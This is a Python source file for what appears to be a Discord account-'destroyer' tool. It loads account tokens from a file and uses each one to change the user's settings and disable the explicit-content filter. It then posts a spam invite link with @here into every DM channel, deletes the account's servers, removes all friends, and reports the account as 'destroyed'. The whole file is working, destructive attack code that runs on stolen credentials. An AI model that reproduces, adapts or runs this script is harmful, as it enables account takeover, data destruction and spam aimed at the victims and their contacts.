import requests
import time
import asyncio
import aiofiles
from style.logo import logo
from style.clear import clear

t = time.strftime('%H:%M:%S')
rs = "\033[0m"
d = '\033[38;2;50;100;255m'
g = "\033[32m"
r = "\033[31m"


async def destroy():
    await clear()
    await logo()
    
    t = time.strftime('%H:%M:%S')
    rs = "\033[0m"
    d = '\033[38;2;50;100;255m'
    g = "\033[32m"
    r = "\033[31m"

    async with aiofiles.open('utils/tokens.txt', 'r') as file:
        tokens = [line.strip() for line in await file.readlines() if line.strip()]

    if not tokens:
        print(f"                                     {d}[{rs}{t}{d}]{rs} {r}[-]{rs} No tokens found in the file! {r}[FAILURE]{rs}")
        return

    for token in tokens:
        headers = {'Authorization': token}
        settings = {
            'theme': "light",
            'locale': "ja",
            'message_display_compact': False,
            'inline_embed_media': False,
            'inline_attachment_media': False,
            'gif_auto_play': False,
            'render_embeds': False,
            'render_reactions': False,
            'animate_emoji': False,
            'convert_emoticons': False,
            'enable_tts_command': False,
            'explicit_content_filter': '0',
            'status': "idle"
        }
        try:
            response = requests.patch("https://discord.com/api/v10/users/@me/settings", headers=headers, json=settings)
            if response.status_code == 200:
                print(f"                                     {d}[{rs}{t}{d}]{rs} {g}[+]{rs} Settings changed successfully! {g}[SUCCESS]{rs}")
            else:
                print(f"                                     {d}[{rs}{t}{d}]{rs} {r}[-]{rs} Failed to change settings! {r}[FAILURE]{rs}")
        except Exception as e:
            print(f"                                     {d}[{rs}{t}{d}]{rs} {r}[-]{rs} Error changing settings: {str(e)}")
        try:
            response = requests.get("https://discord.com/api/v10/users/@me/channels", headers=headers)
            channels = response.json()

            if isinstance(channels, list):
                for channel in channels:
                    if "id" in channel:
                        url = f'https://discord.com/api/v10/channels/{channel["id"]}/messages'
                        msg_response = requests.post(url, headers=headers, json={"content": "https://discord.gg/jRtHf5hUvQ @here"})
                        if msg_response.status_code == 200:
                            print(f"                                     {d}[{rs}{t}{d}]{rs} {g}[+]{rs} Message sent to channel {channel['id']} {g}[SUCCESS]{rs}")
                        else:
                            print(f"                                     {d}[{rs}{t}{d}]{rs} {r}[-]{rs} Failed to send message to channel {channel['id']} {r}[FAILURE]{rs}")
            else:
                print(f"                                     {d}[{rs}{t}{d}]{rs} {r}[-]{rs} Unexpected response format for channels: {channels}")
        except Exception as e:
            print(f"                                     {d}[{rs}{t}{d}]{rs} {r}[-]{rs} Error sending messages: {str(e)}")
        try:
            response = requests.get("https://discord.com/api/v10/users/@me/guilds", headers=headers)
            guilds = response.json()

            if isinstance(guilds, list):
                for guild in guilds:
                    if "id" in guild:
                        url = f'https://discord.com/api/v10/guilds/{guild["id"]}'
                        delete_response = requests.delete(url, headers=headers)
                        if delete_response.status_code == 204:
                            print(f"                                     {d}[{rs}{t}{d}]{rs} {g}[+]{rs} Successfully deleted guild {guild['id']} {g}[SUCCESS]{rs}")
                        else:
                            print(f"                                     {d}[{rs}{t}{d}]{rs} {r}[-]{rs} Failed to delete guild {guild['id']} {r}[FAILURE]{rs} {d}[{delete_response.status_code}]{rs}")
        except Exception as e:
            print(f"                                     {d}[{rs}{t}{d}]{rs} {r}[-]{rs} Error deleting guilds: {str(e)}")
        try:
            response = requests.get("https://discord.com/api/v10/users/@me/relationships", headers=headers)
            friends = response.json()

            if isinstance(friends, list):
                for friend in friends:
                    if "id" in friend:
                        url = f'https://discord.com/api/v10/users/@me/relationships/{friend["id"]}'
                        delete_response = requests.delete(url, headers=headers)
                        if delete_response.status_code == 204:
                            print(f"                                     {d}[{rs}{t}{d}]{rs} {g}[+]{rs} Successfully removed friend {friend['id']} {g}[SUCCESS]{rs}")
                        else:
                            print(f"                                     {d}[{rs}{t}{d}]{rs} {r}[-]{rs} Failed to remove friend {friend['id']} {r}[FAILURE]{rs}")
        except Exception as e:
            print(f"                                     {d}[{rs}{t}{d}]{rs} {r}[-]{rs} Error removing friends: {str(e)}")
        try:
            response = requests.get("https://discord.com/api/v10/users/@me", headers=headers)
            user_info = response.json()
            username = f"{user_info['username']}#{user_info['discriminator']}"
            print(f"                                     {d}[{rs}{t}{d}]{rs} {g}[+]{rs} Successfully destroyed account {username} {g}[SUCCESS]{rs}")
        except Exception as e:
            print(f"                                     {d}[{rs}{t}{d}]{rs} {r}[-]{rs} Error retrieving user info: {str(e)}")